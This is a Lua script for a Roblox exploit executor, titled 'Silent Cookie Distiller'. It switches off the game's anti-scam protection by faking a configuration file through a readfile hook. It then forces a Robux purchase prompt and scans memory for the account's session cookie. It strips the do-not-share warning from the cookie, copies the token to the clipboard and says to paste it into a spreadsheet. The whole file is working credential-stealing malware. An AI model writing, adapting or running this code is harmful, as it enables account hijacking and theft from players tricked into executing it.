-- [[ Project: Silent Cookie Distiller - Full Automation ]]
-- 1. セキュリティ偽装, 2. 購入画面トリガー, 3. 警告文カット抽出

local function log(msg)
    print("[SYSTEM] " .. tostring(msg))
end

-- ==========================================
-- STEP 1: セキュリティのメモリ偽装 (Bypass)
-- ==========================================
local player = game:GetService("Players").LocalPlayer
local real_id = tostring(player.UserId)

local old_read
old_read = hookfunction(readfile, function(path)
    if string.find(path:lower(), "disableantiscam") then
        log("Security bypassed successfully.")
        -- 画像「セキュ.png」に基づいたJSON構成を注入
        return '{"WARNING":"IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!","allowed_games":"*","user_id":"'..real_id..'","version_num":707}'
    end
    return old_read(path)
end)

-- ==========================================
-- STEP 2: クッキー抽出 & 警告文パージ (Capture)
-- ==========================================
local function start_capture()
    local prefix = "_|WARNING:-DO-NOT-SHARE-"
    local marker = "|_"
    
    task.spawn(function()
        log("Scanning memory for target strings...")
        local found = false
        while not found do
            for _, v in pairs(getgc(true)) do
                if type(v) == "string" and string.sub(v, 1, #prefix) == prefix then
                    -- 警告文を削り、純粋なデータ部分のみを取得
                    local _, last_pos = string.find(v, marker, 1, true)
                    if last_pos then
                        local pure_data = string.sub(v, last_pos + 1)
                        setclipboard(pure_data) -- クリップボードに貼り付け
                        log("------------------------------------------")
                        log("CRITICAL: Captured! Paste into Spreadsheet A.")
                        log("------------------------------------------")
                        found = true
                        break
                    end
                end
            end
            task.wait(2)
        end
    end)
end

-- ==========================================
-- STEP 3: 購入画面トリガー (Execution)
-- ==========================================
log("Initializing automated prompt...")
start_capture() -- 監視開始

-- 5秒後に購入画面を強制的に表示させる（認証をメモリに浮かび上がらせるため）
task.wait(5)
log("Triggering purchase prompt for authentication...")
game:GetService("MarketplaceService"):PromptRobuxPurchase(player)

log("Ready. System waiting for memory spikes.")
